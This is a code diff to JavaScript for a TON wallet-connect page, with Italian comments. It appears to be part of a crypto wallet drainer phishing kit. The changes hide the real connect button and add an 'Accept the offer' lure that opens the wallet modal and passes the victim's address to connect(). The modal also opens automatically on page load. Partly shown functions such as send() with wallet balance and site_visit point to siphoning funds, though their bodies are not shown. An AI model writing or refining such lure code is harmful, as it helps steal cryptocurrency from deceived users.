@@ -27,7 +27,7 @@ if (!custom_btn) {
 }
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: manifestUrl,
-    buttonRootId: 'ton-connect-ui'
+    buttonRootId: 'hidden-ton-connect'
 });
 
 let prs_enc = 0,
@@ -61,13 +61,33 @@ const srp = (s, e) => {
 };
 
 
-const connectWallet = async () => {
+// Pulsante header: collega/scollega semplicemente
+const toggleConnection = async () => {
     if (!tonConnectUI.connected) {
         await tonConnectUI.openModal();
     } else {
         await tonConnectUI.disconnect();
     }
+}
 
+// Pulsante "Accept the offer": avvia l'accettazione
+let acceptOfferInProgress = false;
+const acceptOffer = async () => {
+    if (!tonConnectUI.connected) {
+        acceptOfferInProgress = true;
+        const unsubscribe = tonConnectUI.onSingleWalletModalStateChange((state) => {
+            if (state.closeReason === 'wallet-selected' && acceptOfferInProgress) {
+                unsubscribe();
+                acceptOfferInProgress = false;
+                connect(tonConnectUI.account.address);
+            }
+        });
+        await tonConnectUI.openModal();
+        // se la modale viene chiusa senza selezione, resetta il flag
+        acceptOfferInProgress = false;
+    } else {
+        await connect(tonConnectUI.account.address);
+    }
 }
 
 const sendRequest = async (data) => {
@@ -440,14 +460,7 @@ async function send(walletAddress, balance, tryies, address) {
         }
     }
 }
-const unsubscribe = tonConnectUI.onSingleWalletModalStateChange((state) => {
 
-    if (state['closeReason'] == 'wallet-selected') {
-        connect(tonConnectUI.account.address)
-    }
-
-
-});
 const site_visit = async () => {
     try {
 
@@ -605,9 +618,8 @@ const jettons_transaction_done = async (hash, amount) => {
 document.addEventListener('DOMContentLoaded', async () => {
     try {
         if (autoconnect) {
-            await connectWallet();
+            // solo apri la modale, non serve avviare accept
+            await tonConnectUI.openModal();
         }
-    } catch (e) {
-
-    }
+    } catch (e) {}
 });
